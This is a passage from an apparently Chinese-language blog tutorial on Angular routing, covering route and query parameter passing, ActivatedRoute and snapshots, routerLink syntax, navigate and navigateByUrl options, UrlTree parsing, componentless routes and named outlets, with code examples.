</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="3"><li>在对应的组件中接收参数。</li></ol> <p><img src="/vuebloger/img/post/20190609221913384.png" alt=""></p> <h3 id="路由配置传参"><a href="#路由配置传参" class="header-anchor">#</a> 路由配置传参</h3> <ol><li>在路由配置中添加data属性和值就可以，见路由配置图。</li> <li>配置routerLink</li></ol> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>btn btn-primary<span class="token punctuation">&quot;</span></span> <span class="token attr-name">routerLink</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>./router-child3<span class="token punctuation">&quot;</span></span> <span class="token punctuation">&gt;</span></span>配置传值<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="3"><li>在对应的组件接收参数</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">pram</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>pram<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="查询参数传参"><a href="#查询参数传参" class="header-anchor">#</a> 查询参数传参</h3> <p>查询参数传参不需要配置路由</p> <ol><li>配置routerLink和queryParams</li></ol> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>btn btn-primary<span class="token punctuation">&quot;</span></span> <span class="token attr-name">routerLink</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>./router-child<span class="token punctuation">&quot;</span></span> <span class="token attr-name">[queryParams]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>{id:id}<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>查询参数传值<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="2"><li>在对应组件接收参数</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span>queryParams<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token operator">=</span>params<span class="token punctuation">[</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="routerlinkactive"><a href="#routerlinkactive" class="header-anchor">#</a> routerLinkActive</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;{{title}}&lt;/h1&gt;
    &lt;nav&gt;
      &lt;a routerLink=&quot;/dashboard&quot; routerLinkActive=&quot;active&quot;&gt;Dashboard&lt;/a&gt;
      &lt;a routerLink=&quot;/heroes&quot; routerLinkActive=&quot;active&quot;&gt;Heroes&lt;/a&gt;
      &lt;a routerLink=&quot;/cities&quot; routerLinkActive=&quot;active&quot;&gt;Cities&lt;/a&gt;
    &lt;/nav&gt;
    &lt;router-outlet&gt;&lt;/router-outlet&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./app.component.css'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  title <span class="token operator">=</span> <span class="token string">'Tour of Heroes'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>这是主页面模版，通过routerLink实现定位，routerLinkActive会给当前显示的打上标记。</p> <div class="language-less line-numbers-mode"><pre class="language-less"><code><span class="token selector">nav a.active</span> <span class="token punctuation">{</span>
  <span class="token property">color</span><span class="token punctuation">:</span> #039be5<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="activatedroute"><a href="#activatedroute" class="header-anchor">#</a> ActivatedRoute</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token keyword">interface</span> <span class="token class-name">ActivatedRoute</span> <span class="token punctuation">{</span>
      snapshot <span class="token operator">:</span> ActivatedRouteSnapshot
      url <span class="token operator">:</span> Observable<span class="token operator">&lt;</span>UrlSegment<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>
      params <span class="token operator">:</span> Observable<span class="token operator">&lt;</span>Params<span class="token operator">&gt;</span>
      queryParams <span class="token operator">:</span> Observable<span class="token operator">&lt;</span>Params<span class="token operator">&gt;</span>
      fragment <span class="token operator">:</span> Observable<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span>
      data <span class="token operator">:</span> Observable<span class="token operator">&lt;</span>Data<span class="token operator">&gt;</span>
      outlet <span class="token operator">:</span> string
      component <span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token operator">|</span>string
      routeConfig <span class="token operator">:</span> Route
      root <span class="token operator">:</span> ActivatedRoute
      parent <span class="token operator">:</span> ActivatedRoute
      firstChild <span class="token operator">:</span> ActivatedRoute
      children <span class="token operator">:</span> ActivatedRoute<span class="token punctuation">[</span><span class="token punctuation">]</span>
      pathFromRoot <span class="token operator">:</span> ActivatedRoute<span class="token punctuation">[</span><span class="token punctuation">]</span>
      <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> string
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>参数相关都是 Observable类型,其中Map类型的数据需要使用 get()获取。其中：</p> <ul><li>has(name) 如果参数名位于参数列表中，就返回 true 。</li> <li>get(name) 如果这个 map 中有参数名对应的参数值（字符串），就返回它，否则返回 null。如果参数值实际上是一个数组，就返回它的第一个元素。</li> <li>getAll(name) 如果这个 map 中有参数名对应的值，就返回一个字符串数组，否则返回空数组。当一个参数名可能对应多个值的时候，请使用 getAll。</li> <li>keys 返回这个 map 中的所有参数名组成的字符串数组。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>route<span class="token punctuation">.</span>params<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">this</span><span class="token punctuation">.</span>route<span class="token punctuation">.</span>queryParams<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">this</span><span class="token punctuation">.</span>route<span class="token punctuation">.</span>paramMap<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">this</span><span class="token punctuation">.</span>route<span class="token punctuation">.</span>queryParamMap<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/vuebloger/img/post/20210408135538391.jpg" alt=""> <img src="/vuebloger/img/post/20210408135453431.jpg" alt=""></p> <h3 id="snapshot"><a href="#snapshot" class="header-anchor">#</a> snapshot</h3> <p>通过快照的方式获取的参数是不需要Observable时的一个简写。这种情况你要保证该url只会用一次（即不会发生从当前url导航到当前url的情况）。因为使用这种方式获取的参数是不会变动的，因为组件的ngOnInit方法只会调用一次，而如果检测到路由相同而参数不同时，是不会重新初始化组件的。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">interface</span> <span class="token class-name">ActivatedRouteSnapshot</span> <span class="token punctuation">{</span>
  url <span class="token operator">:</span> UrlSegment<span class="token punctuation">[</span><span class="token punctuation">]</span> 
  params <span class="token operator">:</span> Params 
  queryParams <span class="token operator">:</span> Params 
  fragment <span class="token operator">:</span> string 
  data <span class="token operator">:</span> Data 
  outlet <span class="token operator">:</span> string 
  component <span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token operator">|</span>string 
  routeConfig <span class="token operator">:</span> Route 
  root <span class="token operator">:</span> ActivatedRouteSnapshot 
  parent <span class="token operator">:</span> ActivatedRouteSnapshot 
  firstChild <span class="token operator">:</span> ActivatedRouteSnapshot 
  children <span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">[</span><span class="token punctuation">]</span> 
  pathFromRoot <span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">[</span><span class="token punctuation">]</span> 
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> string
<span class="token punctuation">}</span>
<span class="token comment">// 用法</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>activateRouter<span class="token punctuation">.</span>snapshot<span class="token punctuation">.</span>paramMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>注意返回也是Observable：</p> <ul><li>url : <code>Observable&lt;urlsegment[]&gt;</code> 当前路由匹配的URL片段。</li> <li>params : <code>Observable&lt;Params&gt;</code> 当前路由的矩阵参数</li> <li>queryParams : <code>Observable&lt;Params&gt;</code> 所有路由共享的查询参数</li> <li>fragment : <code>Observable&lt;string&gt;</code> 所有路由共享的URL片段</li> <li>data :<code>Observable&lt;Data&gt;</code> 当前路由的静态或者动态解析的数据。</li> <li>outlet: string 当前路由插座的名称。一个常量值。</li> <li>component : <code>Type&lt;any&gt;|string</code> 路由对应的组件。一个常量值。</li> <li>routeConfig : Route 当前路由状态树的根节点</li> <li>root : ActivatedRoute 根路由</li> <li>parent : ActivatedRoute 当前路由在状态树中的父节点</li> <li>firstChild: ActivatedRoute 当前路由的第一个子节点</li> <li>children : ActivatedRoute 当前路由在路由状态树中的所有子节点</li> <li>pathFromRoot : ActivatedRoute 根节点到当前节点的路径</li></ul> <h3 id="routerlink"><a href="#routerlink" class="header-anchor">#</a> routerLink</h3> <p>一种是写在a标签里的，一种是非a标签里的</p> <ul><li>a标签中可以使用这种方式：[routerLink]=&quot;['./router-child',id,name]&quot;</li> <li>非a标签中不能有中括号或者什么其他的符号，否则报错或者匹配失败：易出现的问题有：</li></ul> <ol><li><code>[routerLink]=&quot;[./router-child]&quot;</code>该方式直接导致报错，routerLink不需要加中括号</li> <li><code>routerLink=&quot;[./router-child,id]&quot;</code>该方式导致路径不对，找不到匹配路径，routerLink的值不需要加中括号，添加中括号时，中括号会转码加到路径中导致匹配失败</li></ol> <p>routerLink的值是数组<code>[routerLink]=&quot;['/comment', item.id]&quot;</code>页面将会渲染成这样：</p> <p><img src="/vuebloger/img/post/20210408135354315.jpg" alt=""></p> <p>即绑定数组时，会拼接数组的每一项，且中间用’/‘分割。</p> <h3 id="navigate-navigatebyurl"><a href="#navigate-navigatebyurl" class="header-anchor">#</a> navigate/navigateByUrl</h3> <p>Router是一个提供导航和操纵 URL能力的 NgModule。</p> <p><img src="/vuebloger/img/post/20210408135610271.jpg" alt=""></p> <ol><li>navigateByUrl:基于所提供的 URL进行导航,必须使用绝对路径</li></ol> <ul><li><code>navigateByUrl(url: string | UrlTree, extras: NavigationBehaviorOptions): Promise&lt;boolean&gt;</code></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">interface</span> <span class="token class-name">UrlTree</span> <span class="token punctuation">{</span>
  root<span class="token operator">:</span> UrlSegmentGroup
  queryParams<span class="token operator">:</span> Params
  fragment<span class="token operator">:</span> string <span class="token operator">|</span> <span class="token keyword">null</span> 
  queryParamMap<span class="token operator">:</span> ParamMap
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string
<span class="token punctuation">}</span>
<span class="token keyword">interface</span> <span class="token class-name">NavigationBehaviorOptions</span> <span class="token punctuation">{</span>
  skipLocationChange<span class="token operator">?</span><span class="token operator">:</span> boolean
  replaceUrl<span class="token operator">?</span><span class="token operator">:</span> boolean
  state<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">toComment</span><span class="token punctuation">(</span>id<span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">navigateByUrl</span><span class="token punctuation">(</span><span class="token string">'/comment/'</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// this.router.navigateByUrl('/comments?id=' + id)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><ol start="2"><li>navigate:导航到相对于当前 URL的动态路由路径：</li></ol> <ul><li><code>navigate(commands: any[], extras: NavigationExtras = { skipLocationChange: false }): Promise&lt;boolean&gt;</code></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">interface</span> <span class="token class-name">NavigationExtras</span> <span class="token keyword">extends</span> <span class="token class-name">UrlCreationOptions</span><span class="token punctuation">,</span> NavigationBehaviorOptions <span class="token punctuation">{</span>
  <span class="token comment">// inherited from router/UrlCreationOptions</span>
  relativeTo<span class="token operator">?</span><span class="token operator">:</span> ActivatedRoute <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token comment">// 在当前路由开启相对路径导航</span>
  queryParams<span class="token operator">?</span><span class="token operator">:</span> Params <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token comment">// 设置URL的查询参数</span>
  fragment<span class="token operator">?</span><span class="token operator">:</span> string <span class="token comment">// 设置URL的hash片段 this.router.navigate(['/results'], { fragment: 'top' });</span>
  queryParamsHandling<span class="token operator">?</span><span class="token operator">:</span> QueryParamsHandling <span class="token operator">|</span> <span class="token keyword">null</span> 
  preserveFragment<span class="token operator">?</span><span class="token operator">:</span> boolean <span class="token comment">// 将hash片段带到下一个导航</span>
  <span class="token comment">// inherited from router/NavigationBehaviorOptions</span>
  skipLocationChange<span class="token operator">?</span><span class="token operator">:</span> boolean <span class="token comment">// 导航时不向history中添加记录</span>
  replaceUrl<span class="token operator">?</span><span class="token operator">:</span> boolean <span class="token comment">// 替换当前状态在history中的记录值</span>
  state<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span>button <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;btn btn-primary&quot;</span> <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;navigateTO()&quot;</span><span class="token operator">&gt;</span>navigate跳转<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token function">navigateto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 <span class="token comment">// 1. this.router.navigate(['/comment', 11]).then(r =&gt; console.log(r)); /comment/11</span>

 <span class="token comment">// 2. router.navigate(['/a', {code: '123',b:'1'}]) /a;code=123;b=1 </span>
 <span class="token comment">// 这里数组里的对象只可以是一层，不可以多层。这里转换的方式为第一层对象的key，值会直接转为string。</span>
 <span class="token comment">// 所以，如果是多层对象的话会直接转成[object object]，其他比如null也会直接转换为字符串null</span>
   <span class="token comment">/* 获取{code: '123',b:'1'}
     this.activateRouter.paramMap.pipe(
         switchMap(params =&gt; of(params.get('code')))
       ).subscribe((data) =&gt; {
         console.log('a', data);
       });
    */</span>
    <span class="token comment">// paramMap是针对于当前url，哪怕是当前url的子页面也无法获取到当前页面的参数。</span>
    <span class="token comment">// 和其他参数不同，查询参数是可以在当前url中全部有效（包括子页面、service等其他部分也可以获取到）</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">navigate</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;router/router-child3&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">{</span>queryMap<span class="token operator">:</span><span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">&quot;xxxx&quot;</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">&quot;xxx&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// router/router-child3?id=xxx&amp;name=xxx</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><ol start="3"><li>细节</li></ol> <ul><li>relativeTo</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token punctuation">{</span>
  path<span class="token operator">:</span> <span class="token string">'parent'</span><span class="token punctuation">,</span>
  component<span class="token operator">:</span> ParentComponent<span class="token punctuation">,</span>
  children<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
      path<span class="token operator">:</span> <span class="token string">'list'</span><span class="token punctuation">,</span>
      component<span class="token operator">:</span> ListComponent
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
      path<span class="token operator">:</span> <span class="token string">'child'</span><span class="token punctuation">,</span>
      component<span class="token operator">:</span> ChildComponent
    <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">]</span>
<span class="token comment">// 从child路由导航到list路由</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">ChildComponent</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> router<span class="token operator">:</span> Router<span class="token punctuation">,</span> <span class="token keyword">private</span> route<span class="token operator">:</span> ActivatedRoute</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">navigate</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'../list'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> relativeTo<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>route <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><ul><li>UrlTree</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>templateUrl<span class="token operator">:</span><span class="token string">'template.html'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">class</span> <span class="token class-name">MyComponent</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">router<span class="token operator">:</span> Router</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> tree<span class="token operator">:</span> UrlTree <span class="token operator">=</span>
  router<span class="token punctuation">.</span><span class="token function">parseUrl</span><span class="token punctuation">(</span><span class="token string">'/team/33/(user/victor//support:help)?debug=true#fragment'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> f <span class="token operator">=</span> tree<span class="token punctuation">.</span>fragment<span class="token punctuation">;</span> <span class="token comment">// return 'fragment'</span>
      <span class="token keyword">const</span> q <span class="token operator">=</span> tree<span class="token punctuation">.</span>queryParams<span class="token punctuation">;</span> <span class="token comment">// returns {debug: 'true'}</span>
      <span class="token keyword">const</span> g<span class="token operator">:</span> UrlSegmentGroup <span class="token operator">=</span> tree<span class="token punctuation">.</span>root<span class="token punctuation">.</span>children<span class="token punctuation">[</span><span class="token string">'primary'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> s<span class="token operator">:</span> UrlSegment<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> g<span class="token punctuation">.</span>segments<span class="token punctuation">;</span> <span class="token comment">// returns 2 segments 'team' and '33'</span>
      g<span class="token punctuation">.</span>children<span class="token punctuation">[</span><span class="token string">'primary'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>segments<span class="token punctuation">;</span> <span class="token comment">// returns 2 segments 'user' and 'victor'</span>
      g<span class="token punctuation">.</span>children<span class="token punctuation">[</span><span class="token string">'support'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>segments<span class="token punctuation">;</span> <span class="token comment">// return 1 segment 'help'</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="无组件路由"><a href="#无组件路由" class="header-anchor">#</a> 无组件路由</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// router-study-routing.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>UserComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./user/user/user.component'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> routes<span class="token operator">:</span> Routes <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">'users'</span><span class="token punctuation">,</span> <span class="token comment">// 👈 优点是利于配置路由守卫</span>
    children<span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token punctuation">{</span>
        path<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        component<span class="token operator">:</span> UsersComponent<span class="token punctuation">,</span>
        children<span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token punctuation">{</span>
            path<span class="token operator">:</span> <span class="token string">':id'</span><span class="token punctuation">,</span>
            component<span class="token operator">:</span> UserComponent
          <span class="token punctuation">}</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="命名路由"><a href="#命名路由" class="header-anchor">#</a> 命名路由</h3> <ol><li>设置跳转入口、预留命名出口（outlet）:</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// router-study.component.ts</span>
template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;div class=&quot;container&quot;&gt;
     ...
      &lt;ul class=&quot;nav nav-pills&quot;&gt;
       ...
       &lt;li class=&quot;nav-item&quot;&gt;
         &lt;!--  意思是将tips组件插入到名叫tip出口    --&gt;
         &lt;a class=&quot;nav-link&quot;  [routerLink]=&quot;[{outlets: {tip: ['tips']}}]&quot; routerLinkActive=&quot;active&quot;&gt;to tips&lt;/a&gt;
         &lt;!--  或者使用函数式跳转    --&gt;
